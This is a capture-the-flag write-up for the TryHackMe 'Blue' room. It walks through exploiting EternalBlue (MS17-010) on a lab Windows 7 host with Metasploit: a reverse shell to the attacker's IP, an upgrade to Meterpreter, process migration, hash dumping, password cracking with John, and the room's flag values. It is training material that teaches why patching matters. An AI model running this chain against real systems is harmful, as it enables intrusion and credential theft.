---
title: 'Blue (EternalBlue)'
target: 'TryHackMe — Blue'
difficulty: 'easy'
date: 2026-08-26
summary: 'The full EternalBlue chain against a Windows 7 host: MS17-010 recon, exploitation to a raw shell, upgrade to Meterpreter, process migration, hashdump, cracking Jon''s password with John, and three flags.'
role: 'pentest'
tags: ['EternalBlue', 'MS17-010', 'SMB', 'Metasploit', 'Meterpreter', 'hashdump', 'John the Ripper', 'Privilege escalation']
problem: 'A Windows 7 host exposing SMB, unknown patch level. If it is missing MS17-010 it is one of the most reliably exploitable machines there is — the question is confirming that and turning it into SYSTEM.'
action: 'Scanned for open SMB, confirmed MS17-010 with Metasploit, exploited EternalBlue to a shell, upgraded to Meterpreter, migrated to a stable process, dumped hashes, cracked Jon''s with John, and collected three flags.'
outcome: 'SYSTEM-level access on the target, Jon''s cracked password, and all three flags.'
---

Blue is the room almost everyone does early, and for good reason: it's a clean,
end-to-end run of the EternalBlue (MS17-010) exploit against an unpatched Windows
7 box. Recon to SYSTEM to loot, with every stage visible. This walks the whole
chain.

Connect to the TryHackMe network first — download the OpenVPN config from your
Access page and bring it up with `sudo openvpn <file>.ovpn` — then start the room's
machine and take its IP.

## Recon

A service and version scan across the first thousand ports:

```bash
nmap -T4 -sV -Pn -p 1-1000 <target>
```

`-sV` for version detection, `-Pn` to skip host discovery (these boxes often
don't answer pings), `-T4` to move along.

![nmap results showing SMB ports open](/writeups/thm-blue/01-nmap.png)

Three ports back, and they're the tell: **135** (MSRPC), **139** (NetBIOS-SSN)
and **445** (microsoft-ds). Port 445 is SMB, and the version banner puts this on
Windows 7 — the exact profile EternalBlue targets.

The room asks for the exploit's identifier in `ms??-???` form. Metasploit's
search names it:

```bash
msfconsole
search eternalblue
```

![Metasploit search for eternalblue](/writeups/thm-blue/02-search-eternalblue.png)

The top hit is `exploit/windows/smb/ms17_010_eternalblue`. So the vulnerability is
**MS17-010** — the SMBv1 flaw the exploit abuses.

## Gaining access

Select the module and look at what it needs:

```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
```

![show options, setting RHOSTS and LHOST](/writeups/thm-blue/03-show-options-set.png)

Two required values matter: **RHOSTS** (the target) and **LHOST** (your box, where
the callback lands). The single required option the room highlights is `RHOSTS`.

```bash
set RHOSTS <target>
set LHOST <your-vpn-ip>
```

The room wants a specific payload rather than the default Meterpreter — a plain
reverse shell:

```bash
set payload windows/x64/shell/reverse_tcp
```

![setting the reverse_tcp shell payload](/writeups/thm-blue/04-set-payload.png)

Then fire it:

```bash
run
```

![EternalBlue exploitation succeeding, shell opened](/writeups/thm-blue/05-exploit-shell.png)

The output walks the whole EternalBlue mechanic — confirming the target is
vulnerable, grooming the non-paged pool, the "ETERNALBLUE overwrite completed
successfully" line, the egg, and then `WIN`. A command shell session opens and the
banner reads `Microsoft Windows [Version 6.1.7601]` — Windows 7 SP1. You land at
`C:\Windows\system32>`.

## Escalating to Meterpreter

That raw shell works but it's limited — no `ps`, no `migrate`, none of the
post-exploitation tooling. Background it and upgrade.

`Ctrl+Z` to background the session, then use the upgrade module:

```bash
search shell_to_meterpreter
use 0
set session 1
set LHOST <your-vpn-ip>
run
```

![shell_to_meterpreter module configured](/writeups/thm-blue/06-shell-to-meterpreter.png)

That opens a second session — a Meterpreter one. List sessions to see both:

```bash
sessions -i
```

![active sessions: shell and meterpreter](/writeups/thm-blue/07-sessions-list.png)

Session 1 is the original shell; session 2 is Meterpreter running as **NT
AUTHORITY\SYSTEM** on JON-PC. Drop into it:

```bash
sessions 2
```

### Migrating to a stable process

The initial process is fragile — if it dies, the session dies. `ps` lists
everything running, and `migrate` moves the session into a sturdier process:

```bash
ps
migrate <pid>
```

![ps output and process migration](/writeups/thm-blue/08-ps-migrate.png)

Migrating into a long-lived SYSTEM process (a `spoolsv.exe` / stable service
process rather than the transient one you landed in) keeps the session alive and
running at SYSTEM.

## Cracking

With SYSTEM and a stable Meterpreter, dump the local account hashes:

```bash
hashdump
```

![hashdump output](/writeups/thm-blue/09-hashdump.png)

Three accounts: Administrator, Guest, and **Jon** — the non-default user, and the
one worth cracking. Copy Jon's NTLM hash into a file and run John against it with
rockyou, in NT format:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt /home/kali/hash.txt
```

![John cracking Jon's hash](/writeups/thm-blue/10-john.png)

John recovers Jon's password from the wordlist — the account was using something
`rockyou` already knew.

## Flags

Three flags, placed to make you move around the filesystem.

**Flag 1 — system root.** From Meterpreter, navigate to `C:\` and read it:

```
cd ..
cd ..
ls
cat flag1.txt
```

![flag1 at C:\](/writeups/thm-blue/11-flag1.png)

`flag{access_the_machine}`

**Flag 2 — where passwords are stored.** It sits in the config directory
(`C:\Windows\System32\config\`), a nod to where the SAM database lives:

![flag2 contents](/writeups/thm-blue/12-flag2.png)

`flag{sam_database_elevated_access}`

**Flag 3 — Jon's documents.** In `C:\Users\Jon\Documents\`:

```
ls
cat flag3.txt
```

![flag3 in Jon's Documents](/writeups/thm-blue/13-flag3.png)

`flag{admin_documents_can_be_valuable}`

## What I took from this

Blue is the cleanest possible illustration of why unpatched SMB is treated as a
five-alarm fire. MS17-010 had a patch out in March 2017; a box still missing it
goes from a port scan to SYSTEM in about four commands, with a public Metasploit
module doing the hard part. There is no privilege escalation puzzle here because
EternalBlue lands you at SYSTEM directly — the exploit *is* the escalation.

The transferable habit is the Meterpreter upgrade and migration. A raw shell is
enough to prove access but too fragile to work from; `shell_to_meterpreter`
followed by a migrate into a stable SYSTEM process is what turns "I got in" into
"I have a foothold I can actually use." And hashdump into John is the standard
move afterward — SYSTEM lets you read the hashes, and a weak password does the
rest.
